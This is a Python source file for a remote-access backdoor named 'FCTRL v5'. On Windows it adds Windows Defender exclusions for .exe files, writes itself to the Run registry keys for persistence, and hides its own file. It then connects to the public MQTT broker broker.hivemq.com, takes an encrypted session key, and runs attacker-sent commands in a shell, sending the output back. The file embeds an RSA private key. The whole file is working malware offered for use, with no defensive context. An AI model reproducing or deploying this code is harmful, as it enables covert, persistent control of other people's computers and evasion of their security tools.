#client_2.py
import paho.mqtt.client as mqtt
import socket
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import uuid
import json
import os
import sys
import subprocess
import threading
import time


PRIVATE_KEY_B64 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBNTBCRkJCWmU3OUcxRU9sZzI0S2N2d2kxZ05xb1JyOS8zRHpGSVVRVkhiRGdMZnF0CjQ3RDgweHk1empURGdjOWZGeDhEd2xkRVRTb3I0V1dFTXM4cWgydGZwSWFhMlRPZXNMU0pCdDRieFdEcVY0ZVQKZ0ZwbERtZStFSmZFRVk5YmhPSXBBd1FmSzJZRW52Z3RBUU9oaEZ1L3o0ekI5TUdNNWQxYlBDS0pUbnhZM2VNeAo1cW1FRHhyblpLN1ZERlRRaFMra0FkMHNTUkNScnUxTy9kUC9OTjlHVDNmSVpXeXdPc1JmQmlQTHh0NitySnVXCnNOY3JJTXlLNG1aSWdUM3BwZ1ZUUFR3V0dQR0ZaL0NPL1BZdkd5RW00eGV0THIvSnZFM2FjNTNrNSs4WUVQcVAKOHh6OFp2V0dnZjhIa1ZDSlJjcGUzZEdsK1JCNWxCRFVFTFVSS1FJREFRQUJBb0lCQUJKbHY2L2c3ejNkVlU1QwpnT01KejdwWGdTZ2VqVFZ1c2dlRm1xbklPclZWWDJwdEIzVkdQUUQzSjdXVzUwaHVKT3FvSENLVGtvS2dsS1BlCmtZOUF3Y21MQW0yS2kycDFBNzZiYUV6Z2NmMW9sZEF2b0MyZGsyMWJWY2pJYUMvODg1c2Rhb1dieC9hS0M5dFIKVTNSQms1R2VBb01xdDdvSEJYUjZvVEhtTGY0Tk9nWVovbmlVc2lBYUJpdTBZa1orQWMxKzA3OE5xcXREb0xjawovRHh2eUZDQlE4RVppQStncDY5cnkrYUtmR0NnbXVSY1BVVUR4M21DY09vL2xiMTV3cjE1NHQ3Mnc4dU02TlhUCmJUckVJYm8rQk4yUDJFTVBLWmV2Q1dCbzZrY1lJWFZLcWdoRmNBTmoyUVBMM2dXMUtRZXpHdFFEd1dnd2RiaGUKYmZGS2NDRUNnWUVBOGIxcUFOa3FBTGdaemtmd1Vxcm1obERxV1BIdGgxTE9CT0hUclp1L3N3UTMzV01UUnJkZwo2dkUxQ1Q4RWVIOHVLcUNlTXdKaEZ6TCtxWGppSVhOT2NoajRpSzdwazBBZEJqSGEzeEw5MTF1Q21KUzdXOUVEClVlaFJydHVYbGlHcGo3R1I3WXkyWnZ0L0Z2QXQxM1RRdVRGekdtWEV5M2kwWkdmK0h5TmZwdUVDZ1lFQTlPUjEKMldtQXV2eG9hOXBCR09QRHVLS3pzY1hFNFQzTzY4dTczOGZOQVRUdGlULysxbTQyT2dHSm42c3RpeS9VQUxtRwp4Uy93NkZVamlGa2lwQmlsTDlkbnhMQ1RNeG1DU29jbmFtUTVGK2dYQ3BraEZOeU85cXd0WFlNMFRJRFA3aGxUCk9TYldIOVdXR1BtZ1BvKzNGTkhpUmcxOHd3alFnSzg2eG5nczIwa0NnWUVBcXl0bzFNTHdkK1BqK2VsOFpMeTQKVUdFWkh2UG5NY3ZUTHlmTVlBQ0pnN08zN3QzSmQyZy9pdnhTaG9LRm91RERDdElDVXJJYmwzYTNWYjdQdDhuUwp3UDJuZGZrTVVRU3p5SUFpcjVQZUE5QzdMMWtaTlZGUlhYejM0YTJCcjMrVWRiZlJVWGd5YThjbTNWSWgwNDdXCmdGdGdXayszUWkvczQ2K3pBODlqV21FQ2dZRUE4NlFBSTZlMWJWTUZ5SmZCd0RPS1c3MXpyZUFtK2pqMkR0NEoKTXFDanN4bW5ZYStMcUdiS0NIZlRKa20xN0E1UGk5RUk1bEhHQ2ovNk5BTUtWZHczTEJ2UW4zMVZWYmVCU3dpZwpERmRkL2d6b0w2RWRxcFdzbm5tNlFKanloVko2akZZaDJIQnRCQXNKWkJ1bWM5ZWp2RkQ4SDluM1VFc0t0WnlnCml5aXc2QkVDZ1lCQ2Fvd1Y4emdJUlR0LzNHeE1NbFpENU96eVUxdmJuSDl5cUgzTWxqYUNKby9DcGpwenBOYlgKK0lkcGJjdEdaRUkwK1RvanV2WWhiSGc3eGk0N2l2RStlN3JtWWh3cTRhSWY5RitNWlJ2dk4xSFkvVzNQR2VzVwpxUVYyMVZZWXRqQ0VHWUR6WC9KL1lRdm12Y1Iya1YrQmJRVHA0VUpGQmd2RzB5aEJCek1UK1E9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQ=="  # ← 替换为你生成的


def exec_path():
    if getattr(sys, "frozen", False):
        application_path = sys.executable
    elif __file__:
        application_path = os.path.abspath(__file__)
    return application_path

if os.name == "nt":
    os.system('reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions" /v .exe /t REG_DWORD /d 1 /f')
    os.system('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions" /v .exe /t REG_DWORD /d 1 /f')
    os.system(f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "FCTRL v5" /d "{exec_path()}" /f')
    os.system(f'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "FCTRL v5" /d "{exec_path()}" /f')
    os.system(f'attrib +s +h +a "{exec_path()}"')


private_key_data = base64.b64decode(PRIVATE_KEY_B64)
private_key = RSA.import_key(private_key_data)
rsa_decryptor = PKCS1_OAEP.new(private_key)

default_shell = "cmd.exe" if os.name == "nt" else "/bin/sh"
hostname = f"{os.getpid()}@{socket.gethostname()}"
sessions = {}
session_aes_key = None

broker = "broker.hivemq.com"
port = 1883
topic = "FCTRL/secure"

def encrypt_message(message: str, key: bytes, iv: bytes):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(message.encode("utf-8"), AES.block_size))
    return base64.b64encode(iv + encrypted).decode("utf-8")

def decrypt_message(encrypted_message: str, key: bytes):
    try:
        data = base64.b64decode(encrypted_message)
        iv = data[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(data[AES.block_size:]), AES.block_size)
        return decrypted.decode("utf-8")
    except Exception:
        return None

def publish_json_message(client, topic, message: dict):
    global session_aes_key
    if session_aes_key is None:
        return
    json_msg = json.dumps(message)
    iv = get_random_bytes(16)
    encrypted = encrypt_message(json_msg, session_aes_key, iv)
    client.publish(topic, encrypted)

def handle_output(session_id):
    pipe = sessions[session_id].stdout
    while True:
        output = pipe.readline()
        if output:
            publish_json_message(client, topic, {
                "type": "cmdoutput",
                "session_id": session_id,
                "output": output
            })
        else:
            publish_json_message(client, topic, {
                "type": "end_session",
                "target": hostname,
                "session_id": session_id
            })
            sessions[session_id].terminate()
            break

def on_connect(client, userdata, flags, rc):
    print(f"[+] Connected with result code {rc}")
    client.subscribe(topic)

def on_message(client, userdata, msg):
    global session_aes_key

    if session_aes_key:
        decrypted = decrypt_message(msg.payload.decode(), session_aes_key)
        if decrypted is not None:
            try:
                json_msg = json.loads(decrypted)
                if json_msg.get("target") == hostname:
                    if json_msg.get("type") == "new_session":
                        session_id = uuid.uuid4().hex
                        publish_json_message(client, topic, {
                            "type": "confirm_session",
                            "message_id": json_msg.get("message_id"),
                            "session_id": session_id
                        })
                    elif json_msg.get("type") == "start_session":
                        session_id = json_msg.get("session_id")
                        sessions[session_id] = subprocess.Popen(
                            default_shell, shell=True,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            text=True, encoding='utf-8', errors='replace'
                        )
                        threading.Thread(target=handle_output, args=(session_id,), daemon=True).start()
                    elif json_msg.get("type") == "cmd_input":
                        session_id = json_msg.get("session_id")
                        command = json_msg.get("input")
                        if session_id in sessions:
                            sessions[session_id].stdin.write(command + "\n")
                            sessions[session_id].stdin.flush()
            except:
                pass
            return


    try:
        encrypted_key_data = base64.b64decode(msg.payload)
        aes_key = rsa_decryptor.decrypt(encrypted_key_data)
        if len(aes_key) == 16:
            session_aes_key = aes_key
            print("[+] Session key set")
            publish_json_message(client, topic, {"type": "status", "client": hostname})
    except Exception as e:
        pass 

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

while True:
    try:
        client.connect(broker, port, 60)
        break
    except Exception as e:
        time.sleep(5)

client.loop_start()

def update_status():
    while True:
        if session_aes_key:
            publish_json_message(client, topic, {"type": "status", "client": hostname})
        time.sleep(0.5)

threading.Thread(target=update_status, daemon=True).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    pass
finally:
    for sid in list(sessions.keys()):
        if session_aes_key:
            publish_json_message(client, topic, {
                "type": "end_session", "target": hostname, "session_id": sid
            })
        sessions[sid].terminate()
    client.loop_stop()
    client.disconnect() 